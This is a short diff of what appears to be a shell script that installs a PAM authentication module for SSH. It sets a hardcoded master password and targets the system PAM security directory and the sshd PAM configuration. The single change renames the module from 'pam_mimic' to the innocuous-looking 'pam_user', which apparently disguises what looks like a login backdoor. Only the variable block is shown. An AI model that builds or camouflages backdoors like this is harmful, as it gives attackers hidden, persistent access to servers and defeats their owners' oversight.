@@ -2,7 +2,7 @@
 
 # Variables
 MASTER_PASSWORD="mimic"
-MODULE_NAME="pam_mimic"
+MODULE_NAME="pam_user"
 MODULE_FILE="${MODULE_NAME}.c"
 SO_FILE="/lib/x86_64-linux-gnu/security/${MODULE_NAME}.so"
 PAM_SSHD_CONF="/etc/pam.d/sshd"
